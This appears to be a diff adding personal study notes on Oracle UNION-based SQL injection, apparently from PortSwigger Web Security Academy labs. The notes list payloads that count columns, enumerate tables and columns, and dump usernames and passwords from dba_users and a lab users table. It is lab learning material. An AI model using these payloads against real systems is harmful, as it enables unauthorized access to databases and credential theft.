@@ -1,0 +1,28 @@
+
+  ### 
+   On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like: ' UNION SELECT NULL FROM DUAL--. 
+	 
+  EX beginner payload https://ac751f531eb07e11c02f0fa200640041.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL%20FROM%20DUAL--
+  
+  ###
+  - Find the number of columns
+		○ ' UNION SELECT NULL,NULL FROM DUAL --
+	- See what each data type each column contains
+		○ ' UNION SELECT 'abc','abc' FROM DUAL--
+	- Get users from Oracle Database
+		○ ' UNION SELECT username,password FROM dba_users--
+		
+		- Get tables and owners to tables you have access to
+			§ /filter?category=' UNION SELECT table_name,owner FROM all_tables--
+		- Get tables and owners of all tables
+			§ /filter?category=' UNION SELECT table_name,owner FROM dba_tables--
+		- Get column names of target table
+			§ ' UNION SELECT column_name,table_name FROM all_tab_columns WHERE table_name = 'USERS_UZMLRU' --
+			PASSWORD_SVPWLA
+				USERS_UZMLRU
+			USERNAME_CCDWOD
+				USERS_UZMLRU
+			
+		- Get Usernames and passwords from target Oracle table
+			§ ' UNION SELECT PASSWORD_SVPWLA,USERNAME_CCDWOD FROM%20 USERS_UZMLRU --
+
